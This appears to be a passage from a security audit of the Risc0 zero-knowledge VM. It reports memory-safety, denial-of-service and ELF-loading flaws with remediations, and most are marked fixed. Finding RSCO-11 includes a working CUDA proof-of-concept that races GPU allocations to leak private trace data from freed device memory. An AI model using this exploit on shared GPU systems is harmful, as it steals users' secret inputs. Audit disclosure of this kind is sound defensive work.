### [RSCO-3] DoS with SHA ECALL using big block compression count

**Severity:** High

**Path:** zkvm/src/exec/executor.rs

**Description:**

In the executor.rs the function ecall_sha() implements the SYSCALL(3), which is meant to be the SHA256 hash function's implementation. It takes as arguments the out-state, in-state, blocks' pointers, and the count of the block compressions. 

In case the syscall is being called indirectly through library functions provided by Risc0, there is a check to ensure that the count is no bigger than `MAX_SHA_COMPRESS_BLOCKS` (1000).

```
// Limit syscall buffers so that the Executor doesn't get into an infinite
// split situation.
pub const MAX_BUF_BYTES: usize = 4 * 1024;
pub const MAX_BUF_WORDS: usize = MAX_BUF_BYTES / WORD_SIZE;
pub const MAX_SHA_COMPRESS_BLOCKS: usize = 1000;

...

pub unsafe extern "C" fn sys_sha_buffer(
    out_state: *mut [u32; DIGEST_WORDS],
    in_state: *const [u32; DIGEST_WORDS],
    buf: *const u8,
    count: u32,
) {
...
    while count_remain > 0 {
        let count = min(count_remain, MAX_SHA_COMPRESS_BLOCKS as u32);
        ecall_4(
            ecall::SHA,
            out_state as u32,
            in_state as u32,
            ptr as u32,
            ptr.add(DIGEST_BYTES) as u32,
            count,
        );
...
    }
}
```
The SYSCALL(3) can also be called directly through the ELF’s assembly, passing the count parameter (A4 register) as a bigger number, and the ecall_sha() function will fail to do the sanity check on the count’s value. 

This leads to a Denial of Service of the executor system, with the CPU and Memory resources being exhausted. We have created a Proof of Concept, which uses a count value as low as 10000 and overflows the Memory with more than 130GB as well as overloading the CPU, keeping in mind that the count can be set up to a maximum value of 2^32 -1. 

It is important to note that this attack vector is crucial for proving ecosystems such as Bonsai or any other systems that users might want to create in future. E.g. Bonsai’s single server can be DoS’ed with only one proving request transaction.

```
    fn ecall_sha(&mut self) -> Result<OpCodeResult> {
        let out_state_ptr = self.monitor.load_register(REG_A0);
        let in_state_ptr = self.monitor.load_register(REG_A1);
        let mut block1_ptr = self.monitor.load_register(REG_A2);
        let mut block2_ptr = self.monitor.load_register(REG_A3);
        let count = self.monitor.load_register(REG_A4);

        let in_state: [u8; DIGEST_BYTES] = self.monitor.load_array(in_state_ptr)?;
        let mut state: [u32; DIGEST_WORDS] = bytemuck::cast_slice(&in_state).try_into().unwrap();
        for word in &mut state {
            *word = word.to_be();
        }

        log::debug!("Initial sha state: {state:08x?}");
        for _ in 0..count {
          ...
        }
```

**Remediation:**  Add a check in executor’s ecall_sha() function to panic or bail in case the the count is bigger than `MAX_SHA_COMPRESS_BLOCKS`.

**Status:**  Fixed

## Medium Risk

### [RSCO-6] ELF segment virtual address can be set to an arbitrary address

**Severity:** Medium

**Path:** binfmt/src/elf.rs

**Description:**

The function load_elf() loads and checks the ELF sections and checks that the file size and each segment’s size are not bigger than MAX_MEM (2^28 by default). However, it fails to check that the virtual address (vaddr), which eventually is the address of the section in the guest environment, does not overlap with the system memory region.

The virtual memory layout in Risc0 has hardcoded address regions for user and system spaces:

```/// Program (text followed by data and then bss) gets loaded in
/// starting at this location.  HEAP begins right afterwards.
pub const TEXT_START: u32 = 0x0000_0400;
/// Top of stack; stack grows down from this location.
pub const STACK_TOP: u32 = 0x0BF_FFC00;
/// Minimum mount of room to leave for the stack when allocating from the heap.
pub const RESERVED_STACK: u32 = mb(1) as u32;
pub const SYSTEM: Region = Region::new(0x0C00_0000, mb(16));
pub const PAGE_TABLE: Region = Region::new(0x0D00_0000, mb(16));
pub const PRE_LOAD: Region = Region::new(0x0D70_0000, mb(9));
```
This situation can lead to system memory overwriting, where a malicious ELF can subtly change the guest program's initial state, which otherwise would have been impossible due to memory read/write security checks. This means the code disassembly or decompilation will not show malicious instructions. However, the other segments' layouts may collide with the system memory region and undermine the expected program execution flow.

```
            let vaddr: u32 = segment.p_vaddr.try_into()?;   
            let offset: u32 = segment.p_offset.try_into()?;
            for i in (0..mem_size).step_by(4) {
                let addr = vaddr.checked_add(i).context("Invalid segment vaddr")?;
                if i >= file_size {
                    // Past the file size, all zeros.
                    image.insert(addr, 0);
                } else {
                    let mut word = 0;
                    // Don't read past the end of the file.
                    let len = std::cmp::min(file_size - i, 4);
                    for j in 0..len {
                        let offset = (offset + i + j) as usize;
                        let byte = input.get(offset).context("Invalid segment offset")?;
                        word |= (*byte as u32) << (j * 8);
                    }
                    image.insert(addr, word);
                }
            }
```

**Remediation:**  Add a security check to ensure the ELF sections' virtual addresses can only be loaded in the user memory region. 

**Status:**  Fixed

### [RSCO-5] Ecall parameters missing address range check

**Severity:** Medium

**Path:** zkvm/src/exec/executor.rs

**Description:**

The executor’s ecall functions that correspond to their syscalls (`ecall_sha`, `ecall_halt`, `ecall_input`, `ecall_software`, `ecall_bigint`) are missing the security check to ensure that the memory pointers provided by the guest programs are not out of user space memory. As the ecall functions have input and output parameters using which the syscall reads and writes the data, a malicious guest program can abuse this to bypass the MemoryMonitor’s security check done in `read_mem` and `write_mem` functions:

```
fn read_mem(&mut self, addr: u32, size: MemAccessSize) -> Option<u32> {
    if addr < TEXT_START || addr as usize >= SYSTEM.start() {
        return None;
    }
    ...
}

fn write_mem(&mut self, addr: u32, size: MemAccessSize, store_data: u32) -> bool {
    if addr < TEXT_START || addr as usize >= SYSTEM.start() {
        return false;    
    }
    ...
}
```
Thus giving the ability to read and write to arbitrary addresses, including SYSTEM and PAGE_TABLE regions.

```    fn ecall_input(&mut self) -> Result<OpCodeResult> {
        log::debug!("ecall(input)");
        let in_addr = self.monitor.load_register(REG_A0);
        self.monitor
            .load_array::<{ DIGEST_WORDS * WORD_SIZE }>(in_addr)?;
        Ok(OpCodeResult::new(self.pc + WORD_SIZE as u32, None, 0))
    }
```
```fn ecall_sha(&mut self) -> Result<OpCodeResult> {
    let out_state_ptr = self.monitor.load_register(REG_A0);    
    let in_state_ptr = self.monitor.load_register(REG_A1);    
    let mut block1_ptr = self.monitor.load_register(REG_A2);    
    let mut block2_ptr = self.monitor.load_register(REG_A3);    
    let count = self.monitor.load_register(REG_A4);    
    
    let in_state: [u8; DIGEST_BYTES] = self.monitor.load_array(in_state_ptr)?;
    
    ...
    self.monitor
      .store_region(out_state_ptr, bytemuck::cast_slice(&state))?;
    ...
}
```

**Remediation:**  Add checks to ecall implementations to ensure that the memory addressed by the parameters does not overlap with system space.

**Status:**  Fixed

## Low Risk

### [RSCO-11] CUDA memory can leak private inputs from data trace

**Severity:** Low

**Path:**  risc0/zkvm/src/host/server/prove/prover_impl.rs

**Description:**

Risc0 implements GPU acceleration for proving calculations, such as field operations, NTT/INTT, and Poseidon/SHA hashes functions. The prover supports CUDA and Metal architectures and has built kernels for parallelized calculations. In order to gain performance and for kernels to access the trace columns, the prover allocates GPU device memory to store the trace and to do calculations on the field elements. 

In the case of CUDA, the CudaBuffer is used, which eventually calls cust’s `DeviceBuffer.uninitialized()` function and allocates GPU device memory via cuda_malloc(). 

```
    pub unsafe fn uninitialized(size: usize) -> CudaResult<Self> {
        let ptr = if size > 0 && size_of::<T>() > 0 {
            cuda_malloc(size)?
        } 
        ...
    }
```
Another observation is that the prover allocates the HAL buffer (CUDA buffer in this particular case) in the `ProverServer.prove_segment()`function using copy_from_elem and immediately passes it as an argument to the `prover.commit_group`:

```
        prover.commit_group(
            REGISTER_GROUP_DATA,
            hal.copy_from_elem("data", &adapter.get_data().as_slice()),
        );
```
It may seem that the CUDA buffer’s lifetime will be limited to the commit_group function’s call as it transfers the ownership, although the buffer is being inserted into the prover’s groups vector:

```
        // buf ownership is transferred to make_coeffs and returned back to coeffs
        let coeffs = make_coeffs(self.hal, buf, group_size);
        // PolyGroup takes the ownership and gets inserted into self.groups
        let group_ref = self.groups[tap_group_index].insert(PolyGroup::new(
            self.hal,
            coeffs,
            group_size,
            self.cycles,
            "data",
        ));
```
This makes the CUDA buffer outlive the commit_group’s scope and be dropped at the end of the prove_segment function; this is crucial as the buffer is not being deallocated explicitly in the code, but rather when the object is being dropped (end of prove_segment) the cuda_free will be called:

```
    pub fn drop(mut dev_buf: DeviceBuffer<T>) -> DropResult<DeviceBuffer<T>> {
      ...
            unsafe {
                match cuda_free(ptr) {
                    Ok(()) => {
                        mem::forget(dev_buf);
                        Ok(())
                    }
      ...
    }
```
Eventually, this means that the data trace will not be deallocated and rewritten in the GPU device’s memory during proof generation; our empirical observations validate this as well.

The weakness arises due to a number of facts:  the trace can contain private inputs (secret values), the buffer lifetime is prolonged during the proof generation (a computationally expensive process) and the fact that the buffer is not explicitly zeroed out on the deallocation. The security rule of thumb is to store secret values (no matter what type of memory) for the shortest possible period of time, as well as to guarantee that it will be zeroed out upon deallocation.

For the attack, one can leverage how the GPU handles the device memory and the allocations/deallocations. The function cuda_malloc() allocates a buffer in the device memory; this memory is also referred to as “global memory” - as technically, this memory can be further reallocated by other GPU contexts (processes) upon its deallocation. 

There are security measures implemented in the modern GPU drivers to implicitly address this kind of memory leakage, hence the reason why the local testing setup will most likely not be vulnerable. The main mitigation is to zero out the memory upon freeing; this mechanism is also referred to as memory scrubbing. 

It is crucial to mention that Memory scrubbing is an undefined behaviour in CUDA/Nvidia drivers and is not a guaranteed feature. There are setups where the automatic memory scrubbing can be disabled, e.g: 

Some chips may not have it enabled

Most of the SLI configurations will have it disabled

Manual configurations can disable the feature

Older drivers don't have the feature implemented

Building sophisticated kernels to trick the driver into failing to allocate the scrubber’s internal structures. 

etc.

These situations can be observed in [Nvidia’s open-source kernel modules](https://github.com/NVIDIA/open-gpu-kernel-modules) source code; nevertheless, as most of the drivers' code is closed-source and undocumented, it is hard to tell which are the exact cases when the memory scrubbing is enabled or disabled. 

Given all this information, a low-privileged attacker (non-root) or even a remote attacker (in case the GPU resource is being shared and in an insecure manner) can create a malicious CUDA kernel to leak the secret data from the trace. The attacker can leverage the GPU allocator mechanisms to allocate the recently freed memory. Much like the libc’s malloc() function, the GPU memory allocator also tends to allocate the same-sized chunks from the recently freed list. This, and the fact that the memory allocation size for the trace is publicly known for every guest program, gives the attacker a big edge over the chances of a successful attack.

Example of attacking code:

```#include <stdio.h>

#define TRACE_SIZE 29229056 * 4 //this size is taken for JSON example

__global__
void leak(unsigned int* ptr1, unsigned int* ptr2)
{
  //we have two allocations of same size
  //there is some possiblity that ptr2 allocated the trace instead of ptr1
  //so we check it
  if(ptr1[TRACE_SIZE-1] != 0){ //we check the last element at it is a random element generated by executor in the compute_verify and most likely will not be 0
    for(int i=0; i<TRACE_SIZE; i++){
      ptr2[i] = ptr1[i];
    }
  }
  if(ptr2[TRACE_SIZE-1] !=0){
    return; //do nothing, we will always expect that ptr2 containt the leaked data
  }
}

int main(void)
{
  unsigned int* ptr1;
  unsigned int* ptr2;
  unsigned int* result = (unsigned int*)malloc(TRACE_SIZE);

  //starting race
  while(1){

    //hopefully one of this allocations will end up on trace
    cudaMalloc(&ptr1, TRACE_SIZE); 
    cudaMalloc(&ptr2, TRACE_SIZE);

    //try leak
    leak<<<1,1>>>(ptr1,ptr2);

    //get the result and check it
    cudaMemcpy(&result, ptr2, TRACE_SIZE, cudaMemcpyDeviceToHost);

    if(result[TRACE_SIZE-1] !=0){
      break;  //we won!
    }

  }
  printf("Race won!");
  for(int i=0; i<TRACE_SIZE; i++){
      printf("DATA TRACE[%d]: %d\n", i, result[i]);
  }

  cudaFree(ptr1);
  cudaFree(ptr2);
  free(result);
}
```
The attacker will need to start the race condition attack; although the chances to win are heavily inflated as the trace size is usually big and the lifetime of buffer outlives the allocation-extensive proof generation procedure. 

It is worth mentioning that the older versions of GPU drivers had almost no security measures implemented, such as scrubbing, virtual address randomization and segregation, making the attack straightforward.

**Remediation:**  it is recommended to shorten the lifetime of the GPU buffer as much as possible and explicitly zero out the memory before freeing it using DeviceBuffer.[set_8](https://docs.rs/cust/0.3.2/cust/memory/struct.DeviceBuffer.html#method.set_8) function or calling cuMemset function from CUDA API.

### [RSCO-8] Executor ELF loader virtual address word alignment check missing

**Severity:** Low

**Path:** binfmt/src/elf.rs

**Description:**

The function load_elf() parses the ELF binary, loads the memory segments, and does sanity checks on the ELF structure, such as checking that the binary is 32-bit, RISC-V machine type, max memory checks, etc. Nonetheless, it fails to check that the section's virtual address (vaddr) is aligned to word size (4 bytes by default). 

This leads to situations where the page size can become bigger than 1024 bytes (1025-1027 bytes). Although the executor will fail to execute such a program and panic out the process, we are unaware of the circuit behaviour. 

```
            let vaddr: u32 = segment.p_vaddr.try_into()?;   
            let offset: u32 = segment.p_offset.try_into()?;
            for i in (0..mem_size).step_by(4) {
                let addr = vaddr.checked_add(i).context("Invalid segment vaddr")?;
                if i >= file_size {
                    // Past the file size, all zeros.
                    image.insert(addr, 0);
                } else {
                    let mut word = 0;
                    // Don't read past the end of the file.
                    let len = std::cmp::min(file_size - i, 4);
                    for j in 0..len {
                        let offset = (offset + i + j) as usize;
                        let byte = input.get(offset).context("Invalid segment offset")?;
                        word |= (*byte as u32) << (j * 8);
                    }
                    image.insert(addr, word);
                }
            }
```

**Remediation:**  Add a check to ensure that the ELF sections' virtual addresses are all aligned by word size.

**Status:** Fixed

### [RSCO-10] Syscall pointer type parameters missing address range check

**Severity:** Low

**Path:** zkvm/src/host/server/exec/syscall.rs

**Description:**

Risc0’s syscalls (`SysGetenv`, `SysLog`, `SysPanic`, `SysSliceIo`, `PosixIo’s` `sys_write`) read a buffer from the memory via `buf_ptr` and `buf_len` parameters. The `buf_ptr` parameter is missing the security check to ensure that the memory pointers provided by the guest programs are not out of user space memory also for the `buf_ptr + buf_len` pointer. Thus giving the ability to read from arbitrary addresses, including SYSTEM and PAGE_TABLE regions.

```
impl Syscall for SysGetenv {
    fn syscall(
        &mut self,
        _syscall: &str,
        ctx: &mut dyn SyscallContext,
        to_guest: &mut [u32],
    ) -> Result<(u32, u32)> {
        let buf_ptr = ctx.load_register(REG_A3);
        let buf_len = ctx.load_register(REG_A4);
        let from_guest = ctx.load_region(buf_ptr, buf_len)?;
        ...
}
```
```impl Syscall for SysLog {
    fn syscall(
        &mut self,
        _syscall: &str,
        ctx: &mut dyn SyscallContext,
        _to_guest: &mut [u32],
    ) -> Result<(u32, u32)> {
        let buf_ptr = ctx.load_register(REG_A3);
        let buf_len = ctx.load_register(REG_A4);
        let from_guest = ctx.load_region(buf_ptr, buf_len)?;
        let msg = from_utf8(&from_guest)?;
        println!("R0VM[{}] {}", ctx.get_cycle(), msg);
        Ok((0, 0))
    }
}
```


**Remediation:**  Add checks to syscall implementations to ensure that the `buf_ptr` and `buf_ptr + buf_len`  addresses does not overlap with system space.

**Status:** Fixed
